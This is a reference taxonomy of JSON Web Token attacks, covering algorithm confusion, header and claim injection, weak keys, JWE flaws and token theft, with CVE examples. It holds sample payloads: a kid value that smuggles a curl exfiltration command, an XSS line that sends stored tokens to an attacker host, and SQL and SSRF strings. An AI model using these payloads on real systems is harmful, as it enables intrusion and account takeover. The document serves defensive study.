# JWT Attack Mutation Taxonomy

**Version:** 2026-03 | **Scope:** JSON Web Token (JWT / JWS / JWE) attack surface  
**Coverage:** RFC 7515–7519, RFC 8725, 2023–2026 CVEs and bounty disclosures  
*Created for defensive security research and vulnerability understanding purposes.*

---

## Classification Structure

This taxonomy organizes JWT attacks along three axes:

**Axis 1 — Mutation Target (WHAT is attacked):** The structural component of the JWT stack that is mutated or abused — algorithm negotiation, header parameters, payload claims, cryptographic primitives, the key material itself, the token lifecycle, the transport layer, the parsing engine, the encryption layer (JWE), and the deployment architecture.

**Axis 2 — Discrepancy Type (WHAT mismatch it exploits):** The nature of the verification failure that makes the mutation dangerous — signature bypass (the server accepts the token without verifying it), algorithm confusion (the server verifies with the wrong method), claim bypass (the server trusts an unvalidated claim), injection (the server passes attacker-controlled data to a subsystem), key substitution (the server uses an attacker-supplied key), or lifecycle bypass (the server fails to enforce token state).

**Axis 3 — Deployment Scenario (WHERE it lands):** The architectural context that determines exploitability and impact — monolith web applications, microservice meshes, cloud-managed auth (AWS ALB, Azure AD, GCP IAP), OAuth/OIDC flows, IoT device authentication, and agentic AI pipelines.

### Axis 2 Summary Table

| Discrepancy Type | Root Cause | Typical Impact |
|-----------------|-----------|----------------|
| **Signature Bypass** | Server skips or nullifies verification | Full auth bypass |
| **Algorithm Confusion** | Server verifies with wrong algorithm/key | Token forgery |
| **Claim Bypass** | Server trusts unvalidated payload fields | Privilege escalation |
| **Header Injection** | Attacker controls key-selection parameters | Key substitution → forgery |
| **Key Material Weakness** | Predictable/brute-forceable signing secrets | Token forgery |
| **Cryptographic Flaw** | EC/RSA primitive misuse | Private key recovery |
| **Lifecycle Bypass** | No revocation / temporal claim ignored | Replay, persistent access |
| **Parser Differential** | Library parses JSON differently than app | Claim spoofing |
| **Encryption Stripping** | JWE decrypted but inner JWS not verified | Plaintext forgery |
| **Transport / Storage Abuse** | Token exfiltration or injection at rest/transit | Session hijack |

---

## §1. Algorithm Negotiation Attacks

The `alg` header field, being attacker-controlled before the token is verified, is the oldest and most prolifically exploited structural weakness in JWT. An attacker who can force the server to switch from its intended algorithm to a weaker or trivially exploitable one achieves token forgery without needing any secret material.

### §1-1. Null-Algorithm Injection ("none" Bypass)

The JWT specification defines `alg: none` as a valid value for an "unsecured JWT" — a token with no signature at all. Naive libraries that accept this value authenticate the attacker's arbitrary payload.

| Subtype | Mechanism | Example Header | Condition |
|---------|-----------|----------------|-----------|
| **Exact "none"** | Header sets `"alg":"none"`, signature portion is empty | `{"alg":"none","typ":"JWT"}` | Server does not blocklist `none` |
| **Case-variation bypass** | Mixed-case variants bypass string-comparison blocklists | `{"alg":"None"}`, `{"alg":"nOnE"}`, `{"alg":"NONE"}` | Blocklist is case-sensitive |
| **Trailing-dot stripping** | Signature part is omitted but trailing dot retained | `header.payload.` | Parser splits on dots, treats empty sig as valid |
| **"alg" key deletion** | Header submitted without any `alg` field; library defaults to `none` | `{"typ":"JWT"}` | Library has insecure default |

The payload must still be terminated with a trailing dot; the signature portion is empty or entirely absent. Modern variants exploit case-sensitivity in blocklist checks, which remains unpatched in some embedded and IoT deployments (see §12 for IoT-specific replay context).

### §1-2. Symmetric-to-Asymmetric Confusion (RS256 → HS256)

When a server uses RS256, it signs with a private key and verifies with the public key. If that server dynamically selects the verification algorithm from the attacker-controlled `alg` header, an attacker can change `alg` to `HS256` and sign the token with the RSA **public** key as the HMAC secret. The server, now interpreting the public key as an HMAC secret, validates the forged signature.

| Subtype | Mechanism | Key Derivation Method |
|---------|-----------|----------------------|
| **RS256 → HS256** | Attacker resigns with RSA public key as HMAC secret | From `/.well-known/jwks.json`, TLS cert, or embedded in mobile app |
| **ES256 → HS256** | Attacker resigns with ECDSA public key as HMAC secret | Public key extracted from OIDC endpoint or computed from §8-2 |
| **PS256 → HS256** | RSA-PSS public key reused as HMAC secret | Same key discovery paths as RS256 |
| **Public Key Recovery** | Attacker derives public key from two captured tokens without any known endpoint | `rsa_sign2n` / `jwt_forgery.py` / PortSwigger `sig2n` container |

CVE-2024-54150 (cjwt library, CVSS 9.8) is a recent instance: the library accepted the RSA public key passed to its decode function as an HMAC secret because the API design did not distinguish key types. CVE-2025-27371 exploited ECDSA public key recovery to enable token forgery.

### §1-3. Algorithm Downgrade

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **RS512 → RS256 / RS384** | Weaker hash function may leak timing differences useful for side channels | Server permits any RSA family algorithm |
| **PS256 → RS256** | Removes MGF1 padding randomness; deterministic RSA is more vulnerable to differential analysis | Server does not enforce PSS padding |
| **JWE algorithm downgrade** | Attacker switches `"alg"` in JWE from `RSA-OAEP-256` to `RSA1_5` (PKCS#1 v1.5) | Server accepts legacy key wrapping algorithms (Bleichenbacher oracle) |

---

## §2. Header Parameter Injection

The JWS specification defines optional header parameters (`jwk`, `jku`, `kid`, `x5c`, `x5u`, `x5t`) whose purpose is to help the verifier locate the correct key. When a server acts on these values without whitelisting or sanitization, the attacker can supply their own key material and instruct the server to verify the token against it.

### §2-1. JWK Self-Embedding (`jwk` Injection)

The `jwk` header parameter allows a server to embed a public key directly in the token. A misconfigured server that fetches the verification key from this attacker-controlled field accepts any token signed with the corresponding private key.

**Mechanism:** Attacker generates an RSA or EC keypair, signs a forged payload with the private key, and embeds the public key in the `jwk` header. The server verifies the signature against the attacker's own public key.

**Example Header:**
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "e": "AQAB",
    "kid": "attacker-key",
    "n": "<attacker RSA modulus>"
  }
}
```

**Condition:** Server does not maintain an allowlist of trusted keys and instead accepts any key embedded in the header.

### §2-2. JWK Set URL Injection (`jku` SSRF / Key Redirection)

The `jku` header points the verifier to a URL from which it should fetch a JWK Set. If the server fetches this URL without whitelisting, the attacker hosts their own JWKS at an attacker-controlled endpoint.

| Subtype | Bypass Technique | Example |
|---------|-----------------|---------|
| **Direct jku substitution** | Server has no URL whitelist | `"jku":"https://attacker.com/jwks.json"` |
| **Subdomain confusion** | Attacker-controlled subdomain of trusted domain | `"jku":"https://trusted.evil.com/..."` |
| **@ symbol trick** | Browser-URL vs. fetcher interpretation split | `"jku":"https://trusted.com@attacker.com/jwks.json"` |
| **Path traversal on jku** | Server checks `startsWith("https://trusted")` | `"jku":"https://trusted.com/redirect?url=https://evil.com"` |
| **Open redirect chain** | Whitelisted domain has an open redirect | `"jku":"https://trusted.com/api/redirect?to=https://attacker.com/jwks.json"` |
| **Response header injection** | Server fetches jku but is vulnerable to header injection at that URL; attacker plants inline JWKS | Inject `\r\n` into URL path to add malicious Location header |
| **SSRF via jku** | Server can reach internal metadata | `"jku":"http://169.254.169.254/latest/meta-data/"` |

Servers that follow HTTP redirects when fetching `jku` are vulnerable to open-redirect chains even when the initial domain is whitelisted.

### §2-3. X.509 URL Injection (`x5u` / `x5c`)

The `x5u` header is analogous to `jku` but references an X.509 certificate chain. `x5c` embeds the certificate directly.

| Subtype | Mechanism |
|---------|-----------|
| **x5u SSRF** | Server fetches attacker-controlled PEM from `x5u` URL; attacker forges tokens with their own CA |
| **x5c self-signed injection** | Attacker generates a self-signed certificate, embeds it in `x5c`, signs forged payload with the corresponding private key |
| **x5t thumbprint spoofing** | Attacker crafts a cert whose SHA-1 thumbprint matches a whitelisted `x5t` value via hash collision (low practical risk but theoretically in scope for SHA-1) |
| **CVE-2017-2800 / CVE-2018-2633 parsing** | Complex DER/ASN.1 parsing of x5c certificates introduced memory-safety vulnerabilities in some TLS libraries used for verification |

### §2-4. Key ID Injection (`kid`)

The `kid` header is a hint identifying which key to use for verification. It is intended to be an opaque string but is frequently passed unsanitized to subsystems.

| Subtype | Mechanism | Payload Example |
|---------|-----------|-----------------|
| **SQL injection via kid** | kid value used directly in a database query to retrieve the signing key | `"kid": "1' UNION SELECT 'attacker-secret'-- -"` |
| **Path traversal via kid** | kid value used as a file path without sanitization | `"kid": "../../../../../../../dev/null"` (sign with empty/null key) |
| **Command injection via kid** | kid value passed to a shell command | `"kid": "/keys/secret7.key; curl http://attacker.com/exfil"` |
| **SSRF via kid** | kid used to construct an HTTP request to retrieve remote key | `"kid": "http://169.254.169.254/..."` |
| **Predictable key path** | kid guessable; attacker predicts path and provides matching key content | `"kid": "key/12345"` → look for `/key/12345.pem` |

The path traversal subtype is particularly powerful when the server uses HMAC: by pointing `kid` to `/dev/null` or another predictable empty file, the attacker can sign with a null byte (`AA==` base64) and the server accepts the token.

### §2-5. Content-Type Header Injection (`cty`)

The `cty` parameter declares the media type of the payload content. Injecting unusual content types can chain into secondary parsers.

| Subtype | Mechanism |
|---------|-----------|
| **cty: text/xml** | After signature bypass (§1), injecting XML payload can trigger XXE on a downstream XML parser |
| **cty: application/x-java-serialized-object** | Chaining with signature bypass to deliver a Java deserialization gadget chain through the JWT payload |

---

## §3. Payload Claim Manipulation

The JWT payload carries all authorization decisions, yet many servers fail to rigorously validate every claim. Manipulating payload claims directly — when signature verification is weak or absent — or exploiting claim validation logic flaws are the most common privilege escalation path.

### §3-1. Privilege Escalation via Role and Permission Claims

| Subtype | Mechanism | Example |
|---------|-----------|---------|
| **Boolean privilege flip** | Change `"isAdmin": false` → `"isAdmin": true` | Works only when signature verification is absent (§1 or §4) |
| **Role array tampering** | Inject elevated roles into a role array | `"roles": ["admin","superuser"]` |
| **Scope expansion** | Broaden OAuth scope claims | `"scope": "read write delete admin"` |
| **Permission claim injection** | Add write/delete to permissions | `"permissions": ["read","write","admin:*"]` |

### §3-2. Identity Claim Spoofing

| Subtype | Mechanism | Real-World Pattern |
|---------|-----------|-------------------|
| **Subject (`sub`) substitution** | Replace own `sub` with victim's UUID or username | Requires weak or bypassed signature |
| **Email claim reliance** | Server maps identity based on `email` rather than `sub`; attacker registers with victim's email or modifies email claim | nOAuth bug ($75,000 total bounty, 2023): attacker modified Azure AD email attribute to control `email` claim in Microsoft identity JWTs |
| **Custom claim manipulation** | Non-standard claims used for access control (tenant_id, org_id, user_type) | Modify custom fields to switch tenant or escalate within org |
| **Sub-claim format confusion** | Server expects UUID but attacker sends a URL or email; causes mapping to wrong account | URI-format subject in OIDC contexts |

### §3-3. Temporal Claim Bypass

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **exp not validated** | Server accepts tokens after their expiration time | Library called with `ignoreExpiration: true` or no exp check |
| **nbf not validated** | Server accepts tokens before their `not before` time | Library does not implement nbf check |
| **exp removal** | Entire `exp` claim deleted; server treats token as perpetually valid | Missing claim defaults to "always valid" in some libraries |
| **Far-future exp** | exp set to year 9999 or max integer value | Server validates exp presence but not reasonableness |
| **NBF client-time manipulation ("Back to the Future")** | Server derives `nbf` from client-supplied date; attacker sends date 2 days in future, getting a token usable today | Clock-derived nbf without server-side validation |
| **IoT pre-signed future tokens** | Physical access during manufacturing used to coerce a Secure Element to sign tokens with iat set far in future (LightSEC 2025 research) | IoT supply-chain attack, SE does not validate time source integrity |

### §3-4. Issuer and Audience Bypass

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **iss not validated** | Server accepts tokens from any issuer | Missing or incomplete iss validation |
| **iss array injection** | Library bug in fast-jwt (pre-5.0.6) accepts `iss` as a string array; attacker includes both legitimate and malicious issuer | Library does not enforce RFC 7519 string type |
| **aud not validated** | Token issued for Service A accepted by Service B | No audience claim or server accepts any audience |
| **Cross-tenant iss spoofing (ALBeast)** | AWS ALB uses a shared public key server; attacker creates their own ALB, sets issuer to victim's expected value, and mints forged tokens (CVE-2024-8901, CVE-2024-10125) | Application exposed directly to internet; no signer-field validation |
| **Cross-service relay** | Token obtained from a low-privilege service replayed against a high-privilege service | Missing aud claim in microservice architecture |

---

## §4. Signature Verification Failure

Beyond algorithm manipulation (§1), some servers simply fail to verify the signature at all, or verify it in a way that can be tricked without changing the algorithm.

### §4-1. Decode Without Verify

Many JWT libraries expose both a `decode()` method (extracts claims without verifying the signature) and a `verify()` method (validates the signature before extracting claims). When developers use `decode()` for authenticated endpoints, any modified token is accepted.

**Condition:** Application code calls the library's decode-only function on the authentication path. Detectable by modifying one bit of the signature and checking if the server still accepts the token.

### §4-2. Empty or Truncated Signature Acceptance

| Subtype | Mechanism |
|---------|-----------|
| **Empty signature** | Signature portion is an empty string but the trailing dot is present: `header.payload.` |
| **Null-byte signature** | Signature is `AA==` (Base64 null byte); some HMAC implementations treat zero-length keys as valid |
| **Signature length mismatch accepted** | Library returns true even when signature does not match, if length differs from expected (historical libsodium-adjacent issues) |

### §4-3. Timing-Based Signature Oracle

Some HMAC implementations compare the computed signature to the presented signature using a non-constant-time comparison. By submitting tokens with a guessed signature byte by byte and measuring response latency, an attacker can reconstruct the valid signature.

**Practical threshold:** Requires network stability and many thousands of requests per byte. More relevant in internal-network scenarios (LAN latency < 1ms).

### §4-4. JWE-Wrapped PlainJWT (Encryption-Without-Signing)

When a library decrypts a JWE and then attempts to parse the inner payload as a SignedJWT, but the inner token is a PlainJWT (`alg: none`), the SignedJWT object is null. If the library's null check short-circuits the signature verification path, the server processes an unsigned token as authentic.

**CVE-2026-29000 (pac4j-jwt, CVSS 10.0, March 2026):** Attacker encrypts a PlainJWT with the server's RSA public key. The decryption succeeds; the inner PlainJWT is accepted without signature verification. Attacker can authenticate as any user including administrators with only the public key.

---

## §5. Key Material Weakness and Secret Exposure

Even when signature verification is correctly implemented, the signing key itself may be weak, leaked, or derivable from observable data.

### §5-1. Weak HMAC Secret (Brute-Force Attack)

HMAC-based JWT security depends entirely on the secrecy and entropy of the shared secret. Weak secrets allow offline brute-force attacks after capturing any valid token.

| Subtype | Mechanism |
|---------|-----------|
| **Dictionary attack** | Common values: `"secret"`, `"password"`, service name, project name, `"123456"` |
| **Default library secrets** | Open-source projects with hardcoded defaults in configuration templates |
| **Hardcoded secrets (CVE-2025-7079, CVE-2025-6950)** | Secret embedded as string literal in firmware (e.g., `"bluebell-plus"` in `jwt.go`); Moxa routers used hardcoded key |
| **Short secrets** | Secrets under 256 bits are brute-forceable with Hashcat on consumer GPU hardware |
| **Environment variable leakage** | Secret exposed via debug logs, `/env` endpoints, error messages, or container introspection |

**Tool:** Hashcat `-m 16500` mode performs GPU-accelerated offline brute-force of HS256/HS384/HS512 tokens.

### §5-2. Signing Key Leakage Paths

| Leakage Vector | Mechanism |
|---------------|-----------|
| **Source code / repository** | Secret committed to git history or `.env` file |
| **Error messages** | Verbose error handlers include secret in diagnostic output |
| **Debug logging** | `JWT_SECRET` logged alongside token during development; log shipped to SIEM |
| **API / admin endpoint** | Config endpoint (like nginx-ui `/preferences`) exposes JWT secret in response body |
| **Mobile app reverse engineering** | HMAC secret embedded in APK/IPA; extracted via `apktool` or `strings` |
| **Client-side JavaScript** | Secret referenced in bundled frontend code |
| **Backup files** | `.bak`, `.old`, or `~` suffixed config files expose secrets via path traversal or directory listing |

### §5-3. Key Rotation Failure

| Subtype | Mechanism |
|---------|-----------|
| **No rotation policy** | Signing key never rotated; old compromised keys remain valid indefinitely |
| **Rotation without revocation** | New key deployed but old tokens signed with previous key remain accepted |
| **Key version confusion** | Multi-key setups where kid routing allows attacker to force use of an older, weaker key |

---

## §6. Cryptographic Primitive Exploitation

These attacks target weaknesses in the underlying mathematical operations used to generate or verify JWT signatures, independent of the library's high-level API design.

### §6-1. ECDSA Nonce Reuse (Private Key Recovery)

ECDSA requires a unique, cryptographically random nonce `k` for every signature. If the same `k` is used to sign two different messages, both signatures share the same `r` value, and an attacker can solve for the private key algebraically in O(1) given the two (r, s, hash) tuples.

**Detection:** Compare the `r` values across all collected ES256/ES384/ES512 tokens. Matching `r` values indicate nonce reuse.

**Recovery formula:** `k = (h1 - h2) / (s1 - s2) mod n` ; `priv = (s·k - h) / r mod n`

**Real-World Context:** Sony PlayStation 3 (2011) and numerous Ethereum wallets fell to this attack. In JWT contexts, any IoT firmware or hardware security module that signs tokens with a biased PRNG is vulnerable. CVE-2025-27371 involved ECDSA public key recovery enabling token forgery across cloud implementations.

### §6-2. ECDSA Biased-Nonce Lattice Attack (LLL)

Even when nonces are not directly reused, if the nonce generation leaks even a few bits of information (e.g., the nonce always starts with several zero bits), a lattice reduction algorithm (LLL/BKZ) can recover the private key given enough signatures.

| Bias Condition | Signatures Needed |
|---------------|------------------|
| 4 bits fixed | ~100 signatures |
| 80 bits fixed (Yubikey bug) | 5 signatures |
| 1 bit leaked (LadderLeak/OpenSSL) | A few hundred signatures |

**Practical Impact:** Routers, IoT devices, or HSMs with poorly seeded PRNGs that sign many JWT tokens are recoverable.

### §6-3. JWE Invalid Curve Attack (ECDH-ES Private Key Recovery)

When JWE uses `ECDH-ES` key agreement, the receiver's private key is used to compute the shared secret. If the library does not validate that the ephemeral public key from the sender lies on the correct elliptic curve, an attacker can supply a point on a small-order curve. This causes the receiver's private key computation to operate in a small group, leaking partial key information. By submitting multiple JWEs with different small-order points and applying the Chinese Remainder Theorem, the attacker recovers the full private key.

**Affected libraries (patched):** go-jose, node-jose, jose2go, Nimbus JOSE+JWT, jose4  
**Condition:** JWE with `"alg":"ECDH-ES"` and library does not validate that the `epk` (ephemeral public key) is on the declared curve.

### §6-4. RSA PKCS#1 v1.5 Bleichenbacher Oracle

JWE supports `RSA1_5` key wrapping (PKCS#1 v1.5). Servers that distinguish between "bad padding" and "decryption failure" in their error responses act as a decryption oracle, allowing adaptive chosen-ciphertext attacks to decrypt arbitrary RSA ciphertext.

**Condition:** Server uses `"alg":"RSA1_5"` in JWE AND provides distinguishable error responses for padding vs. decryption failures.

---

## §7. Token Lifecycle and State Management Failures

JWT's stateless design means servers hold no token registry, making revocation an architectural afterthought. This section covers attacks that exploit the gap between token state and session state.

### §7-1. Post-Logout Replay

When a user logs out, client-side code deletes the stored token, but the token itself remains cryptographically valid until expiration. An attacker who captures the token before logout can replay it throughout its remaining lifetime.

**Condition:** No server-side revocation mechanism (blacklist, jti registry, version counter). Token lifetime is long (hours or days).

**Detection:** Save a token before logout; present it after logout to an authenticated endpoint.

### §7-2. Token Blacklist / Denylist Bypass

Applications that implement revocation through a jti-based denylist may be bypassed if:

| Subtype | Mechanism |
|---------|-----------|
| **jti claim absent** | Token lacks a `jti`; revocation logic silently skips blacklist check |
| **jti collision** | Attacker crafts a token with a jti that does not appear in the blacklist (guessable numeric jti) |
| **Blacklist not propagated** | In microservice architecture, logout call updates one service's Redis but other services do not receive the invalidation event |
| **Blacklist TTL mismatch** | Blacklist entry expires before the token's `exp`; token becomes valid again |
| **Refresh token not revoked** | Access token revoked but long-lived refresh token remains valid; attacker uses it to mint new access tokens |

### §7-3. Token Replay in Multi-Party Flows

| Subtype | Mechanism |
|---------|-----------|
| **Authorization code → token reuse** | Access token captured from one user session replayed in another without a nonce binding |
| **Refresh token rotation bypass** | Some implementations issue a new refresh token but accept the old one within a grace window; attacker races to reuse the old token |
| **Cross-device session persistence** | Long-lived refresh token stolen from one device; used indefinitely on attacker's device |

### §7-4. Key Rotation Without Token Invalidation (Insider Abuse)

When an organization's signing key is compromised or rotated due to personnel changes, previously issued JWTs signed with the old key may remain accepted. Unless all outstanding tokens are explicitly revoked, an insider or attacker with the old key retains persistent access.

---

## §8. Key Reference and Discovery Attacks (JWKS Endpoint Abuse)

### §8-1. JWKS Endpoint Enumeration

Most deployments expose public keys at `/.well-known/jwks.json` or `/oauth/v2/keys`. These are legitimate, but the information they expose enables downstream attacks.

| Subtype | Purpose |
|---------|---------|
| **Public key extraction** | Enables §1-2 algorithm confusion; enables §8-2 key recovery |
| **kid enumeration** | Identifies which key IDs are trusted; enables kid-targeting in §2-4 |
| **Algorithm discovery** | Reveals all supported algorithms; identifies weakest option |

### §8-2. RSA / EC Public Key Derivation from Tokens

When no JWKS endpoint is available, an attacker can derive the RSA public key from two or more tokens signed with the same private key using the mathematical relationship between the RSA signature, the message hash, and the public modulus.

**Tool:** `rsa_sign2n` (GitHub: silentsignal), PortSwigger `sig2n` Docker container  
**Process:** Supply two captured tokens → tool outputs candidate public keys → test each with algorithm confusion attack (§1-2).

---

## §9. Payload Injection and Secondary Parser Attacks

These attacks treat the JWT payload as an untrusted input vector for downstream subsystems, independent of whether the signature is valid.

### §9-1. Injection via Claims Used as Query Parameters

When a server directly interpolates JWT claim values into database queries, file system paths, or OS commands without sanitization, standard injection attacks follow:

| Subtype | Claim Used | Attack Vector |
|---------|-----------|---------------|
| **SQL injection via payload** | `username`, `sub`, `email` inserted into SQL | `"sub": "admin'--"` |
| **NoSQL injection via payload** | MongoDB query built from claims | `"org": {"$gt": ""}` |
| **LDAP injection via payload** | LDAP search filter built from `email` or `cn` claim | `"email": "*)(&(uid=*"` |
| **Path traversal via payload** | Claim used to construct file path | `"profile_image": "../../etc/passwd"` |

### §9-2. JWT Compression Attack (CRIME-Like)

The JWE specification allows compressed plaintext before encryption (`"zip":"DEF"` — DEFLATE). If an attacker can influence both the compressed plaintext (e.g., via a reflected value in the payload) and observe ciphertext length, they can mount a CRIME-style attack to recover secrets from adjacent compression context.

**Condition:** JWE token uses `zip:DEF`; attacker controls at least part of the plaintext and can observe ciphertext length differences.

### §9-3. Type Confusion in Claim Validation

Some JWT libraries are permissive about claim data types in ways that can subvert validation logic:

| Subtype | Mechanism | Library / CVE |
|---------|-----------|---------------|
| **iss as array** | RFC 7519 requires `iss` to be a string; fast-jwt (pre-5.0.6) accepted string arrays, allowing an attacker to include a legitimate issuer alongside a malicious one to pass validation | fast-jwt CVE (2025) |
| **exp as string** | Some libraries coerce string-type exp values; type confusion may bypass expiration checks | Library-specific |
| **Boolean claim as 0/1 integer** | `"isAdmin": 0` evaluated as truthy in weak-typed languages | Application-level |
| **Null claim injection** | Setting a claim to `null` causes undefined behavior in some validators | Library-specific |

### §9-4. Duplicate Key Parsing Differential

The JSON specification does not define behavior when an object contains duplicate keys. Different parsers resolve duplicates differently (first-wins, last-wins, or error). An attacker can craft a payload with duplicate claim keys where the signature covers the first occurrence but the application uses the last:

```json
{"alg":"HS256"}.{"sub":"user","sub":"admin"}.SIG
```

If the verification library reads the first `sub` and the application reads the last `sub`, the attacker achieves claim substitution on a validly-signed token.

---

## §10. JWE (JSON Web Encryption) Specific Attacks

JWE adds an encryption layer but introduces new attack surfaces unique to its structure.

### §10-1. Sign-Encrypt Confusion (JWS/JWE Inversion)

When a library exposes a unified `decode()` interface that handles both JWS (signed) and JWE (encrypted) tokens, an attacker can present a JWE where a JWS is expected. The public key used for JWS signature verification is also usable as a JWE encryption key (RSA-OAEP). An attacker who obtains the server's public key can craft a JWE that decrypts successfully — producing an attacker-controlled plaintext — which the library then treats as a verified JWS payload.

**Presented at Black Hat 2023 ("Three New Attacks Against JSON Web Tokens").**  
**Condition:** Library does not enforce token type before processing; accepts both JWS and JWE through the same path.

### §10-2. CEK Confusion (Content Encryption Key Substitution)

In JWE `dir` (direct key agreement) mode, the Content Encryption Key is provided directly rather than being wrapped. If the `enc` algorithm can be switched to a weaker one, or the CEK itself is predictable, the encrypted payload can be decrypted.

### §10-3. JWE Compact vs. JSON Serialization Confusion

JWE supports both compact (`header.key.iv.ciphertext.tag`) and JSON serialization (`{"protected":..., "recipients":...}`). Libraries that parse both formats may behave differently — particularly around which header is treated as authoritative — allowing parameter injection through one serialization while verification happens against the other.

---

## §11. Token Transport and Storage Attacks

### §11-1. localStorage XSS Theft

Tokens stored in `localStorage` or `sessionStorage` are accessible to any JavaScript running on the page origin. A single XSS vulnerability — including via a third-party script dependency — allows complete token exfiltration.

**Payload:** `new Image().src = 'https://attacker.com/steal?t=' + localStorage.getItem('jwt');`

**Impact duration:** Stolen token remains valid until expiry; attacker retains access even after XSS is patched and the victim logs out (unless revocation is implemented; see §7-1).

### §11-2. Cookie-Stored JWT Attacks

| Subtype | Mechanism | Condition |
|---------|-----------|-----------|
| **HttpOnly-absent cookie** | JWT in cookie without HttpOnly flag; JavaScript can read it | Cookie set without HttpOnly |
| **Secure-flag absent** | Token transmitted over HTTP; intercepted by network attacker | Mixed-content or plain-HTTP page |
| **SameSite-absent CSRF** | JWT in cookie with `SameSite=None`; CSRF request automatically includes cookie | No CSRF token for state-changing endpoints |
| **Cookie scope too broad** | Domain set to `.example.com`; token valid on all subdomains; XSS on any subdomain steals it | Overly broad cookie domain |

### §11-3. URL-Embedded Token Exposure

When JWTs are passed in URL parameters (e.g., `?token=eyJ...`), they appear in:
- Browser history
- Server access logs
- Referrer headers sent to third parties
- Shared or bookmarked URLs

**Condition:** Application places JWT in URL path or query string rather than Authorization header.

### §11-4. Man-in-the-Middle Token Interception

| Subtype | Mechanism |
|---------|-----------|
| **HTTP token transmission** | JWT sent over plain HTTP; any network observer captures and replays it |
| **TLS downgrade (HSTS bypass)** | SSLStrip or similar; forces HTTP where token is exposed |
| **Certificate pinning bypass** | Mobile apps without pinning allow mitmproxy interception |

---

## §12. Architecture and Deployment-Level Attacks

These attacks exploit the gap between the JWT specification and real-world multi-component deployment architectures.

### §12-1. Cross-Service Token Relay (Microservice Audience Bypass)

In microservice architectures, a single identity service may issue JWTs consumed by multiple downstream services. If those services do not validate the `aud` (audience) claim, a token issued for a low-privilege service (e.g., read-only API) can be replayed against a high-privilege service (e.g., admin API).

**Real-World Case (HackerOne #1889161, Argo CD, Critical):** Versions starting with v1.8.2 accepted OIDC tokens without validating the `aud` claim, allowing tokens issued for unrelated services to authenticate to the Argo CD API.

### §12-2. Cloud Load Balancer Issuer Forgery (ALBeast)

AWS Application Load Balancer uses a shared regional public key server (`public-keys.auth.elb.<region>.amazonaws.com`) for all customer ALBs. An attacker creates their own ALB, configures it with the victim's expected issuer, and mints JWTs using the shared infrastructure. Applications that validate the signature but not the `signer` field (ALB ARN) in the JWT header accept these forged tokens.

**CVE-2024-8901 / CVE-2024-10125 (AWS, August 2024):** 15,000+ applications identified as potentially vulnerable. Patch requires: (1) validating `signer` header equals expected ALB ARN, and (2) restricting traffic source to ALB security group.

### §12-3. OAuth/OIDC JWT Claim Substitution

When applications accept OIDC identity tokens and map identity based on a mutable claim rather than an immutable identifier:

| Subtype | Mechanism | Bounty |
|---------|-----------|--------|
| **nOAuth email claim attack** | Azure AD allows users to modify their email address in Contact Information; this email flows into the `email` claim of the issued JWT; attacker sets their email to victim's address and authenticates as victim | $75,000 total (donated by Descope, 2023) |
| **Social login email reuse** | Application does not verify email uniqueness across providers; attacker creates account with victim's email via different IdP | Common in multi-IdP setups |
| **Cross-tenant sub spoofing** | `sub` claim is unique per-tenant in some IdPs; same `sub` value reused across tenants by attacker | SaaS platforms with shared IdP |

### §12-4. Multi-Endpoint Inconsistency

In large applications, different microservices may use different JWT libraries, keys, or validation configurations. A JWT configuration that is secure at the primary endpoint may be entirely absent or misconfigured at:
- Legacy API versions (`/api/v1/` vs. `/api/v2/`)
- Internal or partner API routes
- Admin or debug endpoints
- WebSocket upgrade endpoints

**Testing approach:** Obtain a valid token from the primary endpoint; attempt to use it unmodified (or modified) across all discovered endpoints.

### §12-5. IoT / Constrained-Device JWT Abuse

| Subtype | Mechanism |
|---------|-----------|
| **Supply-chain pre-signed tokens** | Attacker with physical access during manufacturing manipulates device clock; coerces Secure Element to sign tokens with `iat` in far future; device later accepts these tokens indefinitely ("Back to the Future", LightSEC 2025) |
| **No nonce in token binding** | RFC 7519 does not mandate nonces; IoT devices with long-lived sessions cannot distinguish replay from fresh authentication |
| **Clock skew exploitation** | IoT devices without reliable time source accept tokens with wide `nbf`/`exp` windows; captured tokens replayed during the window |

---

## §13. Sensitive Data Exposure via Payload

The JWT payload is Base64URL-encoded, not encrypted. Any entity with the token can decode and read all claims.

### §13-1. Sensitive Claims in Unencrypted Payloads

| Risk | Common Claims |
|------|--------------|
| **PII exposure** | `email`, `phone`, `address`, `date_of_birth` in JWT payload readable by any token holder |
| **Internal identifiers** | Database UUIDs, internal user IDs, department codes |
| **Access control metadata** | `clearance_level`, `can_read_phi`, `is_internal` — reveals authorization model |
| **System topology** | `tenant_db_host`, `shard_id`, `region` — leaks infrastructure details |

**Condition:** Token passed through browser history, logs, Referrer headers, or browser plugins; any of these expose the decoded payload.

### §13-2. JWT in Logs and Telemetry

| Leakage Surface | Mechanism |
|----------------|-----------|
| **Access logs** | Token in Authorization header or URL parameter logged by web server |
| **APM traces** | Distributed tracing tools capture request headers including Authorization |
| **Error reporting** | Sentry, Datadog errors include full request context with token |
| **CDN / load balancer logs** | Third-party infrastructure retains tokens |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Categories | Example Impact |
|----------|-------------|-------------------|----------------|
| **Authentication Bypass** | Any | §1, §4, §5, §10 | Full admin access without credentials |
| **Privilege Escalation** | Any | §3-1, §3-2, §3-4 | Low-priv user gains admin role |
| **Cross-Account Takeover** | SaaS multi-tenant | §3-2, §3-4, §12-3 | Access competitor tenant's data |
| **Post-Logout Persistence** | Any | §7-1, §7-2 | Attacker retains access after victim changes password |
| **Cross-Service Relay** | Microservices | §3-4, §12-1 | Low-priv service token accepted by admin service |
| **SSRF via Key Reference** | Cloud / API | §2-2, §2-3, §2-4 | AWS metadata access; internal network scan |
| **Secondary Injection Chain** | Complex backends | §2-4, §9-1 | SQLi / RCE via unsanitized kid / claim |
| **Private Key Recovery** | ECDSA-signed tokens | §6-1, §6-2, §6-3 | Universal token forgery for all users |
| **Supply-Chain / IoT** | Device firmware | §5-1, §12-5 | Persistent backdoor surviving firmware update |
| **Cloud Infrastructure Takeover** | AWS / GCP | §12-2 | Auth bypass across 15,000+ applications |
| **Social Login Impersonation** | OAuth / OIDC | §12-3 | Account takeover without credentials |
| **Agentic AI Session Hijack** | M2M / AI pipelines | §11-1, §7-1, §5-2 | AI agent JWT exfiltrated via prompt injection; credentials remain valid indefinitely |

---

## CVE / Bounty Mapping (2023–2026)

| Mutation Combination | CVE / Case | Affected | Impact / Bounty |
|---------------------|-----------|---------|----------------|
